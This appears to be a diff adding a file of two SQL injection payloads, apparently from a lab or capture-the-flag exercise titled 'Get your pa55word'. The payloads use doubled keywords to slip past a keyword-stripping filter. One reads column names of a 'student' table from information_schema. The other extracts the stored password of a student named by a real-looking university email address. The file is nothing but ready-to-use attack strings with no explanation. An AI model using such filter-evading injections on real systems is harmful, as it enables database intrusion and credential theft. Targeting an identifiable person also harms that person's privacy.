@@ -1,0 +1,4 @@
+[Get your pa55word] abcd' uniounionn selecselectt 'aaa',column_name,'aaa','bbb','ccc','ddd','eee','fff','ggg','hhh','iii','hhh','jjj', 'kkk' from infoorrmation_schema.columns whewherere table_name='student'#Comment
+abcd' uniounionn selecselectt 'aaa',passwoorrd,'aaa','bbb','ccc','ddd','eee','fff','ggg','hhh','iii','hhh','jjj','kkk' from student whewherere email='shivankg@iitk.ac.in' #Comment
+
+
